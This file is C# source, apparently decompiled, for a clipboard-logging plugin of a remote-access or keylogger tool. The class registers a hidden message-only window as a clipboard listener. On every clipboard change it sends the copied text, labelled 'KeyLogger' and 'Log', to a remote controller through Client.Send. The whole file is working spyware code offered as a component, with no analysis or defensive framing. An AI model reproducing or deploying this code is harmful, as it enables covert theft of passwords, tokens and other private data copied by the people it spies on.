using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Leb128;
using Plugin.Helper;

namespace Plugin;

public class ClipboardNotification : Form
{
	private const int WM_CLIPBOARDUPDATE = 797;

	private static IntPtr HWND_MESSAGE = new IntPtr(-3);

	public ClipboardNotification()
	{
		SetParent(((Control)this).Handle, HWND_MESSAGE);
		AddClipboardFormatListener(((Control)this).Handle);
	}

	protected override void WndProc(ref Message m)
	{
		if (((Message)(ref m)).Msg == 797)
		{
			Client.Send(LEB128.Write(new object[3]
			{
				"KeyLogger",
				"Log",
				"\n###  Clipboard ###\n" + Clipboard.GetCurrentText() + "\n"
			}));
		}
		((Form)this).WndProc(ref m);
	}

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool AddClipboardFormatListener(IntPtr hwnd);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((Form)this).ClientSize = new Size(284, 261);
		((Control)this).Name = "ClipboardNotification";
		((Form)this).Load += ClipboardNotification_Load;
		((Control)this).ResumeLayout(false);
	}

	private void ClipboardNotification_Load(object sender, EventArgs e)
	{
	}
}
